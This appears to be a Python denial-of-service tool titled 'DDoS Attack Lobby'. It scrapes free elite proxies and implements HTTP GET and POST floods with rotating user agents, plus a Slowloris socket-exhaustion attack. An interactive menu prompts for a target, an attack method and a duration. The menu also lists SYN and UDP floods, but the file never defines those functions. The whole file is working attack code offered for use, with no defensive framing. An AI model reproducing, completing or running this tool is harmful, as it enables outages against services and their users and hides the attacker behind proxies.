import socket
import threading
import random
import requests
import socks
import time
from itertools import cycle
from bs4 import BeautifulSoup

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
]

# Fetch fresh elite proxies
def fetch_proxies():
    url = "https://free-proxy-list.net/"
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    proxy_list = []
    for row in soup.select("table tbody tr"):
        columns = row.find_all("td")
        if columns[4].text.strip() == "elite proxy":
            proxy = f"{columns[0].text.strip()}:{columns[1].text.strip()}"
            proxy_list.append(proxy)
    return proxy_list

# HTTP GET Flood
def http_get_flood(target_url, duration, proxies=[]):
    timeout = time.time() + duration
    proxy_pool = cycle(proxies) if proxies else None
    while time.time() < timeout:
        try:
            proxy = next(proxy_pool) if proxy_pool else None
            headers = {"User-Agent": random.choice(USER_AGENTS)}
            requests.get(target_url, headers=headers, proxies={"http": proxy, "https": proxy} if proxy else None)
        except:
            pass

# HTTP POST Flood
def http_post_flood(target_url, duration, proxies=[]):
    timeout = time.time() + duration
    proxy_pool = cycle(proxies) if proxies else None
    while time.time() < timeout:
        try:
            proxy = next(proxy_pool) if proxy_pool else None
            headers = {"User-Agent": random.choice(USER_AGENTS)}
            data = {"data": random._urandom(1024)}
            requests.post(target_url, headers=headers, data=data, proxies={"http": proxy, "https": proxy} if proxy else None)
        except:
            pass

# Slowloris Attack
def slowloris(target_ip, target_port, duration):
    timeout = time.time() + duration
    sockets = [socket.socket(socket.AF_INET, socket.SOCK_STREAM) for _ in range(200)]
    for s in sockets:
        try:
            s.connect((target_ip, target_port))
            s.send("GET / HTTP/1.1\r\n".encode("utf-8"))
        except:
            pass
    while time.time() < timeout:
        for s in sockets:
            try:
                s.send("X-a: b\r\n".encode("utf-8"))
            except:
                sockets.remove(s)
                sockets.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))

# Start attack
def start_attack():
    print("\n--- DDoS Attack Lobby ---")
    target = input("Enter Target IP/URL: ")
    method = input("Select Attack Method (SYN/UDP/HTTP-GET/HTTP-POST/SLOWLORIS): ").upper()
    duration = int(input("Enter Attack Duration (seconds): "))
    use_proxies = input("Use proxies? (yes/no): ").lower()
    proxies = fetch_proxies() if use_proxies == "yes" else []
    
    if method == "SYN":
        port = int(input("Enter Target Port: "))
        thread = threading.Thread(target=syn_flood, args=(target, port, duration))
    elif method == "UDP":
        port = int(input("Enter Target Port: "))
        thread = threading.Thread(target=udp_flood, args=(target, port, duration))
    elif method == "HTTP-GET":
        thread = threading.Thread(target=http_get_flood, args=(target, duration, proxies))
    elif method == "HTTP-POST":
        thread = threading.Thread(target=http_post_flood, args=(target, duration, proxies))
    elif method == "SLOWLORIS":
        port = int(input("Enter Target Port: "))
        thread = threading.Thread(target=slowloris, args=(target, port, duration))
    else:
        print("Invalid method!")
        return
    
    thread.start()
    print(f"[+] Attack started on {target} using {method} method!")

if __name__ == "__main__":
    start_attack()
